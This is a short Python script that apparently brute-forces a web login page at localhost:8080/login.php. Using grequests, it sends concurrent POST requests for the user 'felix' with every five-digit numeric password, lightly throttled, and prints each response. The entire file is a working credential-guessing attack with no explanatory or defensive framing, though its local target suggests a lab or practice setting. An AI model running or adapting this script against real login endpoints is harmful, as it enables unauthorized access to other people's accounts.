import grequests
import time

def exp(request, exception):
    print("Request failed", request.data)

url = 'http://localhost:8080/login.php'

rs = []
passes = [i for i in range(10000, 99999)]
rs = [grequests.post(url, data={'user' : 'felix', 'password' : passwd}) for passwd in passes]

print("waiting..")
print(passes)
i = 0
for req in grequests.imap(rs, size=16, exception_handler=exp):
    if i > 20:
        time.sleep(0.3)
        i  = 0
    i += 1
    print(req.text)

